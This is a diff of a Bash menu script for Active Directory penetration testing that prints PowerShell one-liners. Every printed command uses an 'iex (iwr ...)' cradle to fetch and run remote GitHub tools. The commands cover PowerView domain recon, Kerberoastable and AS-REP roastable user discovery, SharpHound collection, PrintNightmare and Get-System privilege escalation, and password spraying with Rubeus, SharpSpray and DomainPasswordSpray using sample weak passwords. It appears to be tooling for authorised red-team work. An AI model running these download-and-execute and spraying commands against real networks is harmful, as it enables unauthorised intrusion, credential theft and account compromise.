@@ -6,17 +6,17 @@
 
 LocalIP="10.10.14.10";		#
 LocalPort="8080";		#
-Username="Moe";			#
+Username="<Username>";			#
 NQUsername="";			#
-Password="Password";			#
-Domain="security.local";			#
+Password="<Password>";			#
+Domain="<Domain>";			#
 NQDomain="";			#
-IP="10.10.10.10";				#
-NQIP="";			#
+IP="<IP>";				#
+NQIP="<IP>";			#
 LDAP="";			#
 baseLDAP="";			#
 DC="";				#
-NS="IP";			#
+NS="<IP>";			#
 Version="v2.1"			#
 MainCheck="1"			#
 
@@ -46,18 +46,21 @@ WHITE='\033[01;37m'
 IBLUE='\033[02;34m'
 ICYAN='\033[02;36m'
 
+adPEASRepo="https://raw.githubusercontent.com/61106960/adPEAS/main/";
 BloodHoundRepo="https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/";
+DomainPasswordSprayRepo="https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/"
 EmpireRepo="https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/";
 GetSystemTechniquesRepo="https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/";
 JAWSRepo="https://raw.githubusercontent.com/411Hall/JAWS/master/";
 LazagneRepo="https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe";
 NishangRepo="https://raw.githubusercontent.com/samratashok/nishang/master/";
 PentestFactoryRepo="https://raw.githubusercontent.com/pentestfactory/Invoke-DCSync/main/";
-PowerSharpPack="https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/";
+PowerSharpPackRepo="https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/";
 PowersploitRepo="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/";
 PowersploitRepo="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/";
-S3cur3Th1sSh1tRepo="https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/";
+S3cur3Th1sSh1tCredsRepo="https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/";
 SecListsRepo="https://github.com/danielmiessler/SecLists/";
+WinPwnRepo="https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/";
 
 iwr="iex (iwr -usebasicparsing "
 DownloadMethod="$iwr"
@@ -74,18 +77,18 @@ echo -e ""
 echo -ne " What would you like to do?
 
 
-
-        1)  ->  [ Recon ]
-        2)  ->  [ Privilege Escalation ]
-        3)  ->  [ Relay Attacks ]
-        4)  ->  [ Password Spraying ]
+	1)  ->  [ MiTM Attacks 		]
+        2)  ->  [ Password Spraying 	]
+        3)  ->  [ Privilege Escalation	]
+        4)  ->  [ Recon 		]
+        
 "
         read a
         case $a in
-	        1) Internal_Menu_Recon ;;
-	        2) Internal_Menu_Privilege_Escalation ;;
-	        3) Internal_Menu_Relay_Attacks ;;
-	        4) Internel_Menu_Password_Spraying ;;
+        	1) Internal_Menu_MiTM_Attacks ;;
+	        2) Internal_Menu_Password_Spraying ;;
+	        3) Internal_Menu_Privilege_Escalation ;;
+	        4) Internal_Menu_Recon ;;
 		0) exit 0 ;;
 		*) echo -e "Wrong option."
         esac
@@ -103,17 +106,17 @@ echo -ne " Select Recon Type
 
 
 
-        1)  ->  [ Local Host Recon ]
-        2)  ->  [ Domain Recon ]
-        3)  ->  [ Network Recon ] 
-        4)  ->  [ File and Share Recon ]
+        1)  ->  [ Domain Recon ]
+        2)  ->  [ File and Share Recon ]
+        3)  ->  [ Local Host Recon ] 
+        4)  ->  [ Network Recon ]
 "
         read a
         case $a in
-	        1) Internal_Menu_Recon_Local_Host ;;
-	        2) Internal_Menu_Recon_Domain ;;
-	        3) Internal_Menu_Recon_Network ;;
-	        4) Internal_Menu_Recon_File_Share ;;
+	        1) Internal_Menu_Recon_Domain ;;
+	        2) Internal_Menu_Recon_File_Share ;;
+	        3) Internal_Menu_Recon_Local_Host;;
+	        4) Internal_Menu_Recon_Network ;;
 		0) exit 0 ;;
 		*) echo -e "Wrong option."
         esac
@@ -166,6 +169,7 @@ echo -ne " Select Domain Recon Type
         7)  -> 	[ Domain Policies 		]
         8)  ->	[ Domain Trusts 		]
         9)  ->  [ Domain Users 			]
+        T)  ->  [ Tools				]
 "
         read a
         case $a in
@@ -178,6 +182,7 @@ echo -ne " Select Domain Recon Type
 	        7) Internal_Menu_Recon_Domain_Policies ;;
 	        8) Internal_Menu_Recon_Domain_Trusts ;;
 	        9) Internal_Menu_Recon_Domain_Users ;;
+	        t|T) Internal_Menu_Recon_Domain_Tools ;;
 		0) exit 0 ;;
 		*) echo -e "Wrong option."
         esac
@@ -190,6 +195,8 @@ Internal_Menu_Recon_Domain_ACL(){
 	
 echo -e ""
 echo -e ""
+echo -e ""
+echo -e "${LGREEN}Domain ACL's and ACE's${RESTORE}"
 echo -e ""
 echo -e "${IBLUE}Search for interesting ACEs${RESTORE}"
 echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Invoke-ACLScanner -ResolveGUIDs"
@@ -204,6 +211,19 @@ echo -e "${IBLUE}Get ACLs for specified prefix${RESTORE}"
 echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-PathACL -Path '\\\\\\\\Security.local\SYSVOL'"
 echo -e ""
 echo -e "" 
+
+echo -ne  "Return to Domain Recon Menu?
+
+
+        1)  ->  [ Domain Recon Menu ]
+"
+
+        read a
+        case $a in
+        	1) Internal_Menu_Recon_Domain ;;
+		0) exit 0 ;;
+		*) echo -e "Wrong option."
+        esac
 
 }
 
@@ -223,7 +243,7 @@ echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetDomain | 
 echo -e ""
 echo -e ""
 
-echo -ne  "Go Back?
+echo -ne  "Return to Domain Recon Menu?
 
 
         1)  ->  [ Domain Recon Menu ]
@@ -245,8 +265,8 @@ Internal_Menu_Recon_Domain_Computers_Servers(){
  
 echo -e ""
 echo -e ""
-echo -e ""   
-echo -e "${LGREEN}Computer Enumeration${RESTORE}"
+echo -e ""
+echo -e "${LGREEN}Domain Computers and Servers${RESTORE}"
 echo -e ""
 echo -e "${IBLUE}All Computers${RESTORE}"
 echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainComputer -Properties Name,OperatingSystem,distinguishedname | Sort Name "
@@ -263,6 +283,19 @@ echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainComput
 echo -e ""
 echo -e ""
 
+echo -ne  "Return to Domain Recon Menu?
+
+
+        1)  ->  [ Domain Recon Menu ]
+"
+
+        read a
+        case $a in
+        	1) Internal_Menu_Recon_Domain ;;
+		0) exit 0 ;;
+		*) echo -e "Wrong option."
+        esac
+
 }
 
 Internal_Menu_Recon_Domain_Forests(){
@@ -271,6 +304,8 @@ Internal_Menu_Recon_Domain_Forests(){
  
 echo -e ""
 echo -e ""
+echo -e ""
+echo -e "${LGREEN}Domain Forests${RESTORE}"
 echo -e ""
 echo -e "${IBLUE}Enumerate trusts across the Domain${RESTORE}"
 echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get details about current Forest"
@@ -286,6 +321,19 @@ echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetForestTru
 echo -e ""
 echo -e ""
 
+echo -ne  "Return to Domain Recon Menu?
+
+
+        1)  ->  [ Domain Recon Menu ]
+"
+
+        read a
+        case $a in
+        	1) Internal_Menu_Recon_Domain ;;
+		0) exit 0 ;;
+		*) echo -e "Wrong option."
+        esac
+
 }
 
 
@@ -296,6 +344,8 @@ Internal_Menu_Recon_Domain_GPO() {
 echo -e ""
 echo -e ""
 echo -e ""
+echo -e "${LGREEN}Domain GPO's${RESTORE}"
+echo -e ""
 echo -e "${IBLUE}Get GPO's in Domain${RESTORE}"
 echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetGPO"
 echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetGPO | Select DisplayName"
@@ -305,6 +355,19 @@ echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetGPO -ADSp
 echo -e ""
 echo -e ""
 
+echo -ne  "Return to Domain Recon Menu?
+
+
+        1)  ->  [ Domain Recon Menu ]
+"
+
+        read a
+        case $a in
+        	1) Internal_Menu_Recon_Domain ;;
+		0) exit 0 ;;
+		*) echo -e "Wrong option."
+        esac
+
 }
 
 Internal_Menu_Recon_Domain_Groups() {
@@ -313,6 +376,8 @@ Internal_Menu_Recon_Domain_Groups() {
  
 echo -e ""
 echo -e ""
+echo -e ""
+echo -e "${LGREEN}Domain Groups${RESTORE}"
 echo -e ""
 echo -e "${IBLUE}List all Groups${RESTORE}"
 echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetGroup"
@@ -326,7 +391,23 @@ echo -e ""
 echo -e "${IBLUE}List Groups of which a user is a member of${RESTORE}"
 echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetGroup Get-NetLocalGroup -Username '<Username>'"
 echo -e ""
+echo -e "${IBLUE}Get all the effective members of a group${RESTORE}"
+echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainGroupMember -Identity "\"Domain Admins"\" -Recurse | Select MemberName,GroupName,MemberObjectClass | Sort Name"
 echo -e ""
+echo -e ""
+
+echo -ne  "Return to Domain Recon Menu?
+
+
+        1)  ->  [ Domain Recon Menu ]
+"
+
+        read a
+        case $a in
+        	1) Internal_Menu_Recon_Domain ;;
+		0) exit 0 ;;
+		*) echo -e "Wrong option."
+        esac
 
 }
 
@@ -337,7 +418,9 @@ Internal_Menu_Recon_Domain_Policies() {
  
 echo -e ""
 echo -e ""
-echo -e ""   
+echo -e ""
+echo -e "${LGREEN}Domain Policies${RESTORE}"
+echo -e "" 
 echo -e "${IBLUE}Password Policy${RESTORE}"
 echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);(Get-DomainPolicy).'SystemAccess'"
 echo -e ""
@@ -345,6 +428,19 @@ echo -e "${IBLUE}Kerberos Policy${RESTORE}"
 echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);(Get-DomainPolicy).'KerberosPolicy'"
 echo -e ""
 echo -e ""
+
+echo -ne  "Return to Domain Recon Menu?
+
+
+        1)  ->  [ Domain Recon Menu ]
+"
+
+        read a
+        case $a in
+        	1) Internal_Menu_Recon_Domain ;;
+		0) exit 0 ;;
+		*) echo -e "Wrong option."
+        esac
 
 }
 
@@ -355,7 +451,9 @@ Internal_Menu_Recon_Domain_Trusts() {
  
 echo -e ""
 echo -e ""
-echo -e ""   
+echo -e ""
+echo -e "${LGREEN}Domain Trusts${RESTORE}"
+echo -e "" 
 echo -e "${IBLUE}Get all Domains in Forest then list each Domain trust${RESTORE}"
 echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetForestDomain -Verbose | Get-NetDomainTrust"
 echo -e ""
@@ -375,6 +473,19 @@ echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Find-ForeignUser
 echo -e ""
 echo -e ""
 
+echo -ne  "Return to Domain Recon Menu?
+
+
+        1)  ->  [ Domain Recon Menu ]
+"
+
+        read a
+        case $a in
+        	1) Internal_Menu_Recon_Domain ;;
+		0) exit 0 ;;
+		*) echo -e "Wrong option."
+        esac
+
 }
 
 
@@ -385,24 +496,73 @@ Internal_Menu_Recon_Domain_Users(){
 echo -e ""
 echo -e ""
 echo -e ""
-echo -e "${IBLUE}User Properties${RESTORE}"
-echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetUser -Properties Name,SamAccountName,Description | Sort Name"
-echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetUser -Properties SamAccountName,Description | Sort SamAccountName"
-echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetUser -Properties Name,Description,pwdlastset,badpwdcount | Sort Name"
+echo -e "${LGREEN}Domain Users${RESTORE}"
 echo -e ""
-echo -e "${IBLUE}Specific user account${RESTORE}"
+echo -e "${IBLUE}Get User Properties${RESTORE}"
+echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetUser -UACFilter NOT_ACCOUNTDISABLE -Properties Name,SamAccountName,Description | Sort Name"
+echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetUser -UACFilter NOT_ACCOUNTDISABLE -Properties SamAccountName,Description | Sort SamAccountName"
+echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetUser -UACFilter NOT_ACCOUNTDISABLE -Properties Name,Description,pwdlastset,badpwdcount | Sort Name"
+echo -e ""
+echo -e "${IBLUE}Get Specific user account${RESTORE}"
 echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetUser -Username '<Username>'"
 echo -e ""
 echo -e "${IBLUE}Search for string in User Description field${RESTORE}"
 echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Find-UserField -SearchField Description -SearchTerm 'built'"
 echo -e ""
-echo -e "${IBLUE}Kerberoastable Users${RESTORE}"
+echo -e "${IBLUE}Get all users with passwords changed more than 3 years ago${RESTORE}"
+echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);\$Date = (Get-Date).AddYears(-3).ToFileTime(); Get-DomainUser -LDAPFilter ""\"(pwdlastset<=\$Date)"\"" -Properties samaccountname,pwdlastset"
+echo -e ""
+echo -e "${IBLUE}Get all users with SPN set${RESTORE}"
+echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainUser -SPN | Select SamAccountName,serviceprincipalname | Sort SamAccountName"
+echo -e ""
+echo -e "${IBLUE}Get all service accounts in "\"Domain Admins"\"${RESTORE}"
+echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainUser -SPN | ?{\$_.memberof -match 'Domain Admins'} | Select SamAccountName | Sort SamAccountName"
+echo -e ""
+echo -e "${IBLUE}Get users with SID History set${RESTORE}"
+echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainUser -LDAPFilter '(sidHistory=*)'"
+echo -e ""
+echo -e "${IBLUE}Kerberoastable users${RESTORE}"
 echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainUser -SPN | Select name,ServicePrincipalName | Sort Name"
 echo -e ""
-echo -e "${IBLUE}AS-REP Roastable Users${RESTORE}"
+echo -e "${IBLUE}AS-REP Roastable users${RESTORE}"
 echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainUser -PreauthNotRequired | Select Name | Sort Name"
 echo -e ""
 echo -e ""
+
+echo -ne  "Return to Domain Recon Menu?
+
+
+        1)  ->  [ Domain Recon Menu ]
+"
+
+        read a
+        case $a in
+        	1) Internal_Menu_Recon_Domain ;;
+		0) exit 0 ;;
+		*) echo -e "Wrong option."
+        esac
+
+}
+
+Internal_Menu_Recon_Domain_Tools(){
+
+
+	clear
+	
+echo -e ""
+echo -e ""
+echo -e ""
+echo -e "${LGREEN}adPEAS${RESTORE}"
+echo -e "$DownloadMethod "$adPEASRepo"adPEAS.ps1);Invoke-adPEAS"
+echo -e "$DownloadMethod "$adPEASRepo"adPEAS-Light.ps1);Invoke-adPEAS"
+echo -e ""
+echo -e ""
+echo -e "${LGREEN}BloodHound${RESTORE}"
+echo -e "$DownloadMethod "$BloodHoundRepo"Collectors/SharpHound.ps1);Invoke-Bloodhound -CollectionMethod All"
+echo -e "$DownloadMethod "$BloodHoundRepo"Collectors/SharpHound.ps1);Invoke-Bloodhound -CollectionMethod All -Loop -Loopduration 06:00:00 -LoopInterval 00:15:00"
+echo -e ""
+echo -e ""
+
 
 }
 
@@ -436,7 +596,9 @@ Internal_Menu_Recon_File_Share() {
     
 echo -e ""
 echo -e ""
-echo -e "" 
+echo -e ""
+echo -e "${LGREEN}File and Share Enumeration${RESTORE}"
+echo -e ""
 echo -e "${IBLUE}Share Enumeration${RESTORE}"
 echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Invoke-ShareFinder -verbose"
 echo -e ""
@@ -473,10 +635,11 @@ echo -ne " Select Privilege Escalation Type
 Internal_Menu_Privilege_Escalation_Checks(){
 
     clear
+    
 echo -e ""
 echo -e ""
 echo -e ""
-echo -e "${LGREEN}Tools${RESTORE}"
+echo -e "${LGREEN}Privilege Escalation (Checks)${RESTORE}"
 echo -e ""
 echo -e "${IBLUE}Invoke-WinPEAS${RESTORE}"
 echo -e "$DownloadMethod "$EmpireRepo"privesc/Invoke-winPEAS.ps1);Invoke-WinPEAS"
@@ -500,8 +663,11 @@ echo -e ""
 Internal_Menu_Privilege_Escalation_Exploits(){
 
     clear
+    
 echo -e ""
 echo -e ""
+echo -e ""
+echo -e "${LGREEN}Privilege Escalation (Exploits)${RESTORE}"
 echo -e ""
 echo -e "${IBLUE}Invoke-Printnightmare${RESTORE}"
 echo -e "$DownloadMethod "$EmpireRepo"privesc/Invoke-Printnightmare.ps1);Invoke-Nightmare"
@@ -511,6 +677,44 @@ echo -e "$DownloadMethod "$EmpireRepo"privesc/Get-System.ps1);Get-System"
 echo -e ""
 echo -e ""   
   
+}
+
+
+Internal_Menu_MiTM_Attacks(){
+
+echo "test"
+
+
+
+}
+
+Internal_Menu_Password_Spraying(){
+
+    clear
+    
+echo -e ""
+echo -e ""
+echo -e ""
+echo -e "${LGREEN}Password Spraying${RESTORE}"
+echo -e ""
+echo -e "${IBLUE}*Invoke-SprayEmptyPassword${RESTORE}"
+echo -e "$DownloadMethod "$S3cur3Th1sSh1tCredsRepo"/PowershellScripts/Invoke-SprayEmptyPassword.ps1);Invoke-SprayEmptyPassword"
+echo -e "$DownloadMethod "$S3cur3Th1sSh1tCredsRepo"/PowershellScripts/Invoke-SprayEmptyPassword.ps1);Invoke-SprayEmptyPassword -Domain Security.local -OutFile EmptyPasswordUsers.txt"
+echo -e ""
+echo -e "${IBLUE}*Domain Password Spray${RESTORE}"
+echo -e "$DownloadMethod "$DomainPasswordSprayRepo"DomainPasswordSpray.ps1);Invoke-DomainPasswordSpray"
+echo -e ""
+echo -e "${IBLUE}*Rubeus${RESTORE}"
+echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Rubeus.ps1);Invoke-Rubeus -Command "\"spray /password:Password123 /noticket /nowrap"\""
+echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Rubeus.ps1);Invoke-Rubeus -Command "\"spray /passwords:PasswordList.txt /noticket /nowrap"\""
+echo -e ""
+echo -e "${IBLUE}*SharpSpray${RESTORE}"
+echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-SharpSpray.ps1);Invoke-SharpSpray"
+echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-SharpSpray.ps1);Invoke-SharpSpray --Passwords Password1,PAsSW0rd,Qwerty123"
+echo -e ""
+echo -e ""
+
+
 }
 
 
